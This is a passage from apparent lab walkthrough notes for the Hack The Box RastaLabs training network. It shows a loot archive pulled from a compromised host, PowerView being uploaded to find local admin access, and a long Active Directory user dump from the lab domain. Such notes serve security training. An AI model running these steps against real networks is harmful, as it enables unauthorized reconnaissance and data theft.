[*] Downloaded 36.26 KiB of 36.26 KiB (100.0%): C:\Users\Public\20260313193007_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260313193007_loot.zip
[*] Completed  : C:\Users\Public\20260313193007_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260313193007_loot.zip
```

## PowerView
### Load
```plain
upload /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 C:\\Users\\Public\\PowerView.ps1
```

```plain
Import-Module C:\Users\Public\PowerView.ps1
```

### Find-LocalAdminAccess
**找本地管理员权限  **

```plain
PS C:\Users\Public> Find-LocalAdminAccess
srv01.rastalabs.local
```

### Get-NetUser
**枚举域用户  **

```plain
PS C:\Users\Public> PS C:\Users\Public> Get-NetUser


name                            : Administrator
logoncount                      : 65535
badpasswordtime                 : 13/03/2026 15:30:20
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mailnickname                    : Administrator
msexchtextmessagingstate        : {302120705, 16842751}
msexchumdtmfmap                 : {emailAddress:2364647872867, lastNameFirstName:2364647872867, 
                                  firstNameLastName:2364647872867}
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Administrator
lastlogontimestamp              : 13/03/2026 03:04:46
userprincipalname               : Administrator@rastalabs.local
msexchuseraccountcontrol        : 0
primarygroupid                  : 513
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-500
codepage                        : 0
samaccountname                  : Administrator
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchelcmailboxflags           : 130
msexchwhenmailboxcreated        : 15/10/2017 14:16:14
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexcharchivequota              : 104857600
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
accountexpires                  : 01/01/1601 00:00:00
cn                              : Administrator
whenchanged                     : 13/03/2026 03:04:46
instancetype                    : 4
usncreated                      : 8196
objectguid                      : 85de4958-4bdc-492f-891f-17bc8fde6458
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
msexchuserculture               : en-US
msexchdumpsterwarningquota      : 20971520
msexcharchivewarnquota          : 94371840
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
distinguishedname               : CN=Administrator,CN=Users,DC=rastalabs,DC=local
dscorepropagationdata           : {20/09/2023 10:04:42, 20/09/2023 09:10:45, 31/08/2021 07:35:32, 31/08/2021 
                                  06:40:54...}
description                     : Built-in account for administering the computer/domain
msexchdumpsterquota             : 31457280
admincount                      : 1
memberof                        : {CN=Organization Management,OU=Microsoft Exchange Security 
                                  Groups,DC=rastalabs,DC=local, CN=Group Policy Creator 
                                  Owners,CN=Users,DC=rastalabs,DC=local, CN=Domain 
                                  Admins,CN=Users,DC=rastalabs,DC=local, CN=Enterprise 
                                  Admins,CN=Users,DC=rastalabs,DC=local...}
mdbusedefaults                  : True
lastlogon                       : 13/03/2026 19:42:01
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
protocolsettings                : RemotePowerShell?1
iscriticalsystemobject          : True
msexchrecipientdisplaytype      : 1073741824
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
badpwdcount                     : 0
proxyaddresses                  : SMTP:Administrator@rastalabs.local
msexchrecipienttypedetails      : 1
msds-supportedencryptiontypes   : 0
whencreated                     : 15/10/2017 11:36:33
countrycode                     : 0
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=abba5e9308d14677b6271ba84049f749-Administrator
msexchversion                   : 88218628259840
pwdlastset                      : 31/08/2021 06:23:26
mail                            : Administrator@rastalabs.local
usnchanged                      : 1499254
msexchmailboxguid               : {133, 80, 137, 54...}
logonhours                      : {255, 255, 255, 255...}
lastlogoff                      : 01/01/1601 00:00:00
samaccounttype                  : USER_OBJECT

pwdlastset             : 01/01/1601 00:00:00
logoncount             : 0
badpasswordtime        : 01/01/1601 00:00:00
description            : Built-in account for guest access to the computer/domain
distinguishedname      : CN=Guest,CN=Users,DC=rastalabs,DC=local
objectclass            : {top, person, organizationalPerson, user}
name                   : Guest
objectsid              : S-1-5-21-1396373213-2872852198-2033860859-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
cn                     : Guest
whenchanged            : 15/10/2017 11:36:33
instancetype           : 4
usncreated             : 8197
objectguid             : 3f1a5ac3-7cef-4a80-a508-f43dc75af0cd
lastlogoff             : 01/01/1601 00:00:00
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata  : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 14:24:59...}
memberof               : CN=Guests,CN=Builtin,DC=rastalabs,DC=local
lastlogon              : 01/01/1601 00:00:00
badpwdcount            : 0
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated            : 15/10/2017 11:36:33
countrycode            : 0
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 8197

pwdlastset             : 01/01/1601 00:00:00
logoncount             : 0
badpasswordtime        : 01/01/1601 00:00:00
description            : A user account managed by the system.
distinguishedname      : CN=DefaultAccount,CN=Users,DC=rastalabs,DC=local
objectclass            : {top, person, organizationalPerson, user}
name                   : DefaultAccount
objectsid              : S-1-5-21-1396373213-2872852198-2033860859-503
samaccountname         : DefaultAccount
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
cn                     : DefaultAccount
whenchanged            : 15/10/2017 11:36:33
instancetype           : 4
usncreated             : 8198
objectguid             : 3cfabbdd-ca48-4de2-8942-5dde92d2e56a
lastlogoff             : 01/01/1601 00:00:00
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata  : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 14:24:59...}
memberof               : CN=System Managed Accounts Group,CN=Builtin,DC=rastalabs,DC=local
lastlogon              : 01/01/1601 00:00:00
badpwdcount            : 0
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated            : 15/10/2017 11:36:33
countrycode            : 0
primarygroupid         : 513
iscriticalsystemobject : True
usnchanged             : 8198

logoncount                    : 0
iscriticalsystemobject        : True
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
showinadvancedviewonly        : True
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 20/09/2023 10:04:42
instancetype                  : 4
usncreated                    : 12324
objectguid                    : d2f4fecf-3d69-4c7c-91a5-8dd68f538582
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 10:04:42, 20/09/2023 09:10:45, 31/08/2021 07:35:32, 31/08/2021 06:40:54...}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=rastalabs,DC=local
lastlogon                     : 01/01/1601 00:00:00
badpasswordtime               : 01/01/1601 00:00:00
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
whencreated                   : 15/10/2017 11:37:22
countrycode                   : 0
primarygroupid                : 513
pwdlastset                    : 15/10/2017 12:37:22
msds-supportedencryptiontypes : 0
usnchanged                    : 1319156

internetencoding                      : 0
logoncount                            : 0
badpasswordtime                       : 01/01/1601 00:00:00
msexchrecipientdisplaytype            : 12
distinguishedname                     : CN=Exchange Online-ApplicationAccount,CN=Users,DC=rastalabs,DC=local
objectclass                           : {top, person, organizationalPerson, user}
msexchtransportrecipientsettingsflags : 0
msexchaddressbookflags                : 1
userprincipalname                     : Exchange_Online-ApplicationAccount@rastalabs.local
msexchgroupsecurityflags              : 0
name                                  : Exchange Online-ApplicationAccount
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1125
samaccountname                        : $531000-S5O9F7AAC4AK
codepage                              : 0
msexchumenabledflags2                 : -1
samaccounttype                        : USER_OBJECT
msexchrecipienttypedetails            : 33554432
accountexpires                        : NEVER
countrycode                           : 0
whenchanged                           : 15/10/2017 13:39:00
instancetype                          : 4
usncreated                            : 23637
objectguid                            : 6a30e580-e756-4053-b0c5-8562ef7ac83d
lastlogon                             : 01/01/1601 00:00:00
msexchmoderationflags                 : 6
msexchmailboxauditlogagelimit         : 7776000
msexchrecipientsoftdeletedstatus      : 0
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmdbrulesquota                   : 256
dscorepropagationdata                 : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                        14:24:59...}
msexchprovisioningflags               : 0
msexchuserbl                          : {CN=MeetingGraphApplication-Exchange Online-ApplicationAccount,CN=Role 
                                        Assignments,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, 
                                        CN=MailboxSearchApplication-Exchange Online-ApplicationAccount,CN=Role 
                                        Assignments,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, 
                                        CN=TeamMailboxLifecycleApplication-Exchange Online-ApplicationAccou,CN=Role 
                                        Assignments,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Mailbox 
                                        Search-Exchange Online-ApplicationAccount,CN=Role 
                                        Assignments,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
msexchuseraccountcontrol              : 0
lastlogoff                            : 01/01/1601 00:00:00
badpwdcount                           : 0
cn                                    : Exchange Online-ApplicationAccount
useraccountcontrol                    : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
whencreated                           : 15/10/2017 13:39:00
msexchmailboxauditenable              : False
primarygroupid                        : 513
msexchversion                         : 1130555651391488
pwdlastset                            : 01/01/1601 00:00:00
usnchanged                            : 23638
msexchbypassaudit                     : False
garbagecollperiod                     : 1209600

mail                                  : SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96}@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {105, 166, 9, 105...}
logoncount                            : 0
codepage                              : 0
msexchrecipientsoftdeletedstatus      : 0
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : SM_85e3a77087d944589
countrycode                           : 0
msexchapprovalapplicationlink         : {CN=ModeratedRecipients,CN=Approval Applications,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, 
                                        CN=AutoGroup,CN=Approval Applications,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local}
userprincipalname                     : SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96}@rastalabs.local
proxyaddresses                        : SMTP:SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96}@rastalabs.local
useraccountcontrol                    : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                            : 24877
dscorepropagationdata                 : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 16/12/2017 14:25:33, 16/12/2017 
                                        14:24:59...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
msexchrecipientdisplaytype            : 10
primarygroupid                        : 513
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1126
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
mailnickname                          : SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96}
displayname                           : Microsoft Exchange Approval Assistant
msexchversion                         : 1126140425011200
objectguid                            : d33158a6-3bc5-4f2c-9ddb-118e44c23c98
objectclass                           : {top, person, organizationalPerson, user}
msexchumdtmfmap                       : {emailAddress:797836624526913052927317847339627123007279396, 
                                        lastNameFirstName:6739242777682513052927323243292203259333256342, 
                                        firstNameLastName:6739242777682513052927323243292203259333256342}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=0855e5dc90ff45199e6c324009525d9c-SystemMailbox{
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 23731
msexchelcmailboxflags                 : 130
msexchwhenmailboxcreated              : 15/10/2017 14:16:18
msexcharchivequota                    : 104857600
msexchcalendarloggingquota            : 6291456
whencreated                           : 15/10/2017 13:39:01
msexchdumpsterquota                   : 31457280
pwdlastset                            : 01/01/1601 00:00:00
whenchanged                           : 15/10/2017 14:16:18
distinguishedname                     : CN=SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96},CN=Users,DC=rastalabs,DC
                                        =local
sn                                    : MSExchApproval 1f05a927-3be2-4fb9-aa03-b59fe3b56f4c
cn                                    : SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96}
msexchbypassaudit                     : False
mdbusedefaults                        : False
msexchtransportrecipientsettingsflags : 0
msexcharchivewarnquota                : 94371840
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexchmailboxtemplatelink             : CN=ArbitrationMailbox,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 6
msexchumenabledflags2                 : -1
name                                  : SystemMailbox{1f05a927-d178-47f3-96c7-1a3007b79d96}
msexchuseraccountcontrol              : 2
accountexpires                        : NEVER
msexchmasteraccountsid                : {1, 1, 0, 0...}
msexchrequireauthtosendto             : True
msexchrecipienttypedetails            : 8388608
msexchgroupsecurityflags              : 0

mail                                  : SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {38, 111, 22, 173...}
logoncount                            : 0
msexchoabgeneratingmailboxbl          : CN=Default Offline Address Book,CN=Offline Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchrecipientsoftdeletedstatus      : 0
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchtextmessagingstate              : {302120705, 16842751}
samaccountname                        : SM_1139242ae3db4b5b8
countrycode                           : 0
msexchapprovalapplicationlink         : {CN=ModeratedRecipients,CN=Approval Applications,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, 
                                        CN=AutoGroup,CN=Approval Applications,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local}
userprincipalname                     : SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@rastalabs.local
proxyaddresses                        : SMTP:SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@rastalabs.local
useraccountcontrol                    : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                            : 24930
dscorepropagationdata                 : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 16/12/2017 14:25:33, 16/12/2017 
                                        14:24:59...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
msexchrecipientdisplaytype            : 10
msexchuseraccountcontrol              : 2
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1127
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
displayname                           : Microsoft Exchange
msexchversion                         : 1126140425011200
codepage                              : 0
objectguid                            : 176e1fab-b589-44c6-8554-4cdb587c10c9
objectclass                           : {top, person, organizationalPerson, user}
msexchumdtmfmap                       : {emailAddress:797836624526922558235973142298337353741329282, 
                                        lastNameFirstName:797836624526922558235973142298337353741329282, 
                                        firstNameLastName:797836624526922558235973142298337353741329282}
submissioncontlength                  : 1048576
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=629b10a126a8416ba4519aaeaf664a2d-SystemMailbox{
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
mdbusedefaults                        : False
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 23736
msexchelcmailboxflags                 : 130
msexchwhenmailboxcreated              : 15/10/2017 14:16:23
msexcharchivequota                    : 104857600
msexchcalendarloggingquota            : 6291456
whencreated                           : 15/10/2017 13:39:01
msexchdumpsterquota                   : 31457280
pwdlastset                            : 01/01/1601 00:00:00
whenchanged                           : 15/10/2017 14:17:39
distinguishedname                     : CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=rastalabs,DC
                                        =local
sn                                    : SystemMailbox bb558c35-97f1-4cb9-8ff7-d53741dc928c
cn                                    : SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
msexchbypassaudit                     : False
mailnickname                          : SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
msexchdumpsterwarningquota            : 20971520
msexchtransportrecipientsettingsflags : 0
msexcharchivewarnquota                : 94371840
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexchmailboxtemplatelink             : CN=ArbitrationMailbox,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchcapabilityidentifiers           : {46, 52, 51, 47...}
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 6
msexchumenabledflags2                 : -1
name                                  : SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
accountexpires                        : NEVER
msexchmasteraccountsid                : {1, 1, 0, 0...}
msexchrequireauthtosendto             : True
msexchrecipienttypedetails            : 8388608
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {42, 150, 208, 91...}
logoncount                            : 0
codepage                              : 0
msexchrecipientsoftdeletedstatus      : 0
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchtextmessagingstate              : {302120705, 16842751}
samaccountname                        : SM_b60219ade4274bccb
countrycode                           : 0
userprincipalname                     : SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@rastalabs.local
proxyaddresses                        : SMTP:SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@rastalabs.local
useraccountcontrol                    : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                            : 24928
dscorepropagationdata                 : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 16/12/2017 14:25:33, 16/12/2017 
                                        14:24:59...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
msexchrecipientdisplaytype            : 10
primarygroupid                        : 513
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1128
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
mailnickname                          : SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
displayname                           : Microsoft Exchange
msexchversion                         : 1126140425011200
objectguid                            : a7f3c4c2-51c9-4630-b45f-6b777007fade
objectclass                           : {top, person, organizationalPerson, user}
msexchumdtmfmap                       : {emailAddress:797836624526930321229892340342678362293823339, 
                                        lastNameFirstName:67392434726837930321229892340342678362293823339, 
                                        firstNameLastName:67392434726837930321229892340342678362293823339}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=26219352ade343198c536fc70c49474e-SystemMailbox{
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 23741
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:16:28
msexcharchivequota                    : 104857600
msexchcalendarloggingquota            : 6291456
whencreated                           : 15/10/2017 13:39:01
msexchdumpsterquota                   : 31457280
pwdlastset                            : 01/01/1601 00:00:00
whenchanged                           : 15/10/2017 14:17:31
distinguishedname                     : CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=rastalabs,DC
                                        =local
sn                                    : MsExchDiscovery e0dc1c29-89c3-4034-b678-e6c29d823ed9
cn                                    : SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
msexchbypassaudit                     : False
mdbusedefaults                        : False
msexchdumpsterwarningquota            : 20971520
msexchtransportrecipientsettingsflags : 0
msexcharchivewarnquota                : 94371840
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexchmailboxtemplatelink             : CN=ArbitrationMailbox,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchcapabilityidentifiers           : 41
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 6
msexchumenabledflags2                 : -1
name                                  : SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
msexchuseraccountcontrol              : 2
accountexpires                        : NEVER
msexchmasteraccountsid                : {1, 1, 0, 0...}
msexchrequireauthtosendto             : True
msexchrecipienttypedetails            : 8388608
msexchgroupsecurityflags              : 0

mail                                  : DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {138, 11, 237, 216...}
logoncount                            : 0
codepage                              : 0
msexchrecipientsoftdeletedstatus      : 0
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : SM_33273f8672e44108a
countrycode                           : 0
userprincipalname                     : DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@rastalabs.local
proxyaddresses                        : SMTP:DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@rastalabs.loc
                                        al
useraccountcontrol                    : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                            : 1200440
dscorepropagationdata                 : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                        14:24:59...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : False
msexchuseraccountcontrol              : 2
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
mdboverhardquotalimit                 : 52428800
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1129
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : e3ca1d2d-4684-448a-8a96-cce9a34e97c5
objectclass                           : {top, person, organizationalPerson, user}
msexchumdtmfmap                       : {emailAddress:347268379732724624526939192205462641538023730933422852, 
                                        lastNameFirstName:673924347268379624526939192205462641538023730933422852, 
                                        firstNameLastName:673924347268379624526939192205462641538023730933422852}
msexchtextmessagingstate              : {302120705, 16842751}
submissioncontlength                  : 102400
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=f6cb1a11fd994437b542e02fbd9b6585-DiscoverySearc
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
displayname                           : Discovery Search Mailbox
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
authorigbl                            : CN=DiscoverySearchMailbox 
                                        {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 23746
mdboverquotalimit                     : 52428800
msexchelcmailboxflags                 : 134
msexchwhenmailboxcreated              : 15/10/2017 14:16:33
msexcharchivequota                    : 104857600
msexchcalendarloggingquota            : 6291456
whencreated                           : 15/10/2017 13:39:01
msexchdumpsterquota                   : 31457280
pwdlastset                            : 01/01/1601 00:00:00
whenchanged                           : 31/08/2021 08:10:15
showinaddressbook                     : {CN=All Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                        Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local}
distinguishedname                     : CN=DiscoverySearchMailbox 
                                        {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=rastalabs,DC=local
sn                                    : MsExchDiscoveryMailbox D919BA05-46A6-415f-80AD-7E09334BB852
cn                                    : DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
msexchbypassaudit                     : False
mailnickname                          : DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
authorig                              : CN=DiscoverySearchMailbox 
                                        {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=rastalabs,DC=local
msexchtransportrecipientsettingsflags : 0
msexcharchivewarnquota                : 94371840
msexchmailboxsecuritydescriptor       : {1, 0, 4, 140...}
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 6
msexchumenabledflags2                 : -1
delivcontlength                       : 102400
